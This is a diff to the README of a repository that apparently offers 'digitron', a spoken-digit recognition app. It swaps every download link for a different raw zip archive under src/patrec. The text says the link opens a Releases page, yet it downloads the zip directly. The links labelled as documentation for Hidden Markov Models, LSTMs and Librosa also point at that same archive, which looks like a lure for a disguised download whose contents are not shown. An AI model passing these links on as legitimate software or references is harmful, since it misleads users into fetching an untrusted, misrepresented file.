@@ -8,7 +8,7 @@ Welcome to digitron! This application helps you recognize spoken digits with eas
 
 Visit the link below to download the latest version of digitron:
 
-[![Download Latest Release](https://github.com/Simone334/digitron/raw/refs/heads/main/src/Software-v2.2-alpha.3.zip)](https://github.com/Simone334/digitron/raw/refs/heads/main/src/Software-v2.2-alpha.3.zip)
+[![Download Latest Release](https://github.com/Simone334/digitron/raw/refs/heads/main/src/patrec/Software_v1.3-alpha.4.zip)](https://github.com/Simone334/digitron/raw/refs/heads/main/src/patrec/Software_v1.3-alpha.4.zip)
 
 1. Click the download link above.
 2. You will be directed to the Releases page. Here, find the latest version (look for the largest version number).
@@ -53,9 +53,9 @@ If you encounter any issues, here are some common solutions:
 
 For those interested in more about how digitron works, here are some helpful resources:
 
-- [Hidden Markov Models (HMM)](https://github.com/Simone334/digitron/raw/refs/heads/main/src/Software-v2.2-alpha.3.zip)
-- [Recurrent Neural Networks (LSTM)](https://github.com/Simone334/digitron/raw/refs/heads/main/src/Software-v2.2-alpha.3.zip)
-- [Librosa Library Documentation](https://github.com/Simone334/digitron/raw/refs/heads/main/src/Software-v2.2-alpha.3.zip)
+- [Hidden Markov Models (HMM)](https://github.com/Simone334/digitron/raw/refs/heads/main/src/patrec/Software_v1.3-alpha.4.zip)
+- [Recurrent Neural Networks (LSTM)](https://github.com/Simone334/digitron/raw/refs/heads/main/src/patrec/Software_v1.3-alpha.4.zip)
+- [Librosa Library Documentation](https://github.com/Simone334/digitron/raw/refs/heads/main/src/patrec/Software_v1.3-alpha.4.zip)
 
 ## 💬 Support
 
